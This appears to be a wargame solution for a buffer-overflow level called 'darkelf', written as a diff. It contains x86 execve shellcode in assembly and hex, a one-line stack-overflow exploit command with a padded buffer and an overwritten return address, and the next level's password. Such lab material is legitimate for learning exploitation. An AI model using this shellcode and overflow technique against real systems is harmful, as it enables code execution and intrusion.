@@ -1,0 +1,42 @@
+<shell.S>
+
+	.section .text
+	.globl _start
+
+	_start:
+        	xor %eax, %eax
+        	push %eax
+       		push $0x73736170
+        	push $0x2d796d2f
+        	push $0x6e69622f
+        	push %eax
+        	lea 4(%esp), %ebx
+        	push %ebx
+        	movb $11, %al
+        	mov (%esp), %ebx
+        	lea (%esp), %ecx
+        	xor %edx, %edx
+        	int $0x80
+
+</shell.S>
+
+<shellcode>
+
+	\x31\xc0\x50\x68\x70\x61\x73\x73\x68\x2f\x6d\x79\x2d\x68\x2f\x62\x69\x6e\x50\x8d\x5c\x24\x04\x53\xb0\x0b\x8b\x1c\x24\x8d\x0c\x24\x31\xd2\xcd\x80
+
+	length: 36
+
+</shellcode>
+
+<command>
+
+	./darkelf "$(for x in `seq 1 40`; do printf "\x90"; done)aaaa$(printf "\x31\xfc\xff\xbf")" "$(printf "\x31\xc0\x50\x68\x70\x61\x73\x73\x68\x2f\x6d\x79\x2d\x68\x2f\x62\x69\x6e\x50\x8d\x5c\x24\x04\x53\xb0\x0b\x8b\x1c\x24\x8d\x0c\x24\x31\xd2\xcd\x80")"
+
+</command>
+
+<next>
+
+	id: darkelf
+	pw: kernel crashed
+
+</next>
